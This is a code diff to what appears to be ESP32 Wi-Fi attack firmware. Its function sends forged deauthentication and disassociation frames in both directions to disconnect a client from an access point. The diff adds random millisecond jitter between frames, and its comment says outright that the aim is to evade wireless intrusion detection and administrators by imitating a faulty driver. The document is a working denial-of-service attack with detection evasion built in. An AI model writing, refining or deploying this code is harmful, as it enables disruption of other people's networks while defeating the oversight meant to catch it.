@@ -10,6 +10,7 @@
 #include <esp_system.h>
 #include <esp_random.h>
 #include <string.h>
+#include <Arduino.h>
 
 // ieee80211_raw_frame_sanity_check lives in cap/sniffer.cpp
 
@@ -255,15 +256,27 @@ void sendBidirectionalKick(const uint8_t* bssid, const uint8_t* client, uint8_t 
     memcpy(cl2ap + 10, client, 6);
     memcpy(cl2ap + 16, bssid, 6);
     cl2ap[24] = reason;
+    // Porkchop-style jitter: a WIDS or sharp admin will see four identical
+    // frames at zero spacing as a tool signature. Spacing them by 1-3 ms
+    // (random per leg and per round) puts the burst inside the
+    // 'looks like a glitchy driver' envelope instead. delay() blocks the
+    // calling task for the given ms; we're on the main loop (not in the
+    // WiFi promiscuous callback) so this is safe.
     for (uint8_t i = 0; i < rounds; i++) {
         ap2cl[0] = 0xC0;
         rawTx(ap2cl, 26);
+        delay(1 + (esp_random() % 3));            // 1..3 ms AP->Client spacing
         cl2ap[0] = 0xC0;
         rawTx(cl2ap, 26);
+        delay(1 + (esp_random() % 3));            // 1..3 ms Client->AP spacing
         ap2cl[0] = 0xA0;
         rawTx(ap2cl, 26);
+        delay(1 + (esp_random() % 3));            // 1..3 ms before disassoc
         cl2ap[0] = 0xA0;
         rawTx(cl2ap, 26);
+        if (i + 1 < rounds) {
+            delay(2 + (esp_random() % 4));        // 2..5 ms between rounds
+        }
     }
 }
 
